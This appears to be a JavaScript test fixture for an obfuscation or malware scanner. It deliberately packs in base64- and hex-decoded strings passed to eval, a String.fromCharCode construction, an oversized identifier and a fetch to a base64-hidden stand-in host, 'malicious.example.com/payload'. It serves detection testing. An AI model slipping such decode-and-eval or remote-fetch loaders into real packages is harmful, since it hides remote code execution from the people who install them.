/**
 * obfuscated-helper v1.0.0
 * Contains various obfuscation and encoding patterns.
 * Uses base64 decoding, atob, long identifiers, eval, and fetch.
 */

// Base64-encoded embedded payload
const payload = Buffer.from('cHJvY2Vzcy5lbnYuU0VDUkVUX0tFWT1zdXBlcl9zZWNyZXQ=', 'base64').toString();

// atob usage
const decoded = atob('dGVzdA==');

// String.fromCharCode for constructing strings
const code = String.fromCharCode(112, 114, 111, 99, 101, 115, 115);

// Extremely long identifier (over 200 chars) to trigger minified/obfuscated detection
const aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = 'this is a very long identifier that looks like minified code';

// Dynamic decode and run
function decodeAndRun(encoded) {
  const jsCode = Buffer.from(encoded, 'base64').toString();
  eval(jsCode);
}

// Network call with decoded URL
function fetchConfig() {
  const url = Buffer.from('aHR0cDovL21hbGljaW91cy5leGFtcGxlLmNvbS9wYXlsb2Fk', 'base64').toString();
  return fetch(url);
}

// Hex-encoded payload execution
function execHex(hexStr) {
  const raw = Buffer.from(hexStr, 'hex').toString();
  eval(raw);
}

module.exports = { decodeAndRun, fetchConfig, execHex, payload, decoded, code };
